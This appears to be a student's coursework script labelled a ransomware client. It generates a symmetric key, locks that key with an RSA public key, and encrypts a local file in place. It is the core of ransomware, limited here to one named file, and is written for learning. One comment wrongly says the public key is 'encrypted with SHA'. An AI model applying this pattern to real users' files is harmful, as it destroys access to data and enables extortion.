# Programmer: Amritpal Singh
# Date: 4 February, 2022
# FileName: RansomwareClient.txt
# Description: Based on Advanced Computer Security Assignment 1

"""Bascially, here we are creating a Sysmmettric key and encryting the sysmmetric key using public key
    We are also encrting a file here using symmetric key"""


# These are some import statements required for our program.....
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet

# Here, we setting up Symmetric key using Fernet MODULE
symmetricKey = Fernet.generate_key()
FernetInstance = Fernet(symmetricKey)


# Opening a file in read binary mode, loading public key from it and we are encrypting the public key with SHA algorithum
with open("public_key.key", "rb") as key_file:
    public_key = serialization.load_pem_public_key(
        key_file.read(),
        backend=default_backend()
    )

    encryptedSymmetricKey = public_key.encrypt(
        symmetricKey,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )


# opening the encryptedSymmetricKey.key file in write binary file and writing the encryptedSysmmetric key in the file
with open("D:\Study\SET\Semester 4\Advance Computer Security\Assignment 1\encryptedSymmertricKey.key", "wb") as key_file:
    key_file.write(encryptedSymmetricKey)



# Defining filepath variable with some in path in it as String
filePath = "FileToEncrypt.txt"

# opening the file we want to encrypt and encryting it with symmetric key..
with open(filePath, "rb") as file:
    file_data = file.read()
    encrypted_data = FernetInstance.encrypt(file_data)

with open(filePath, "wb") as file:
    file.write(encrypted_data)





# All done








quit()

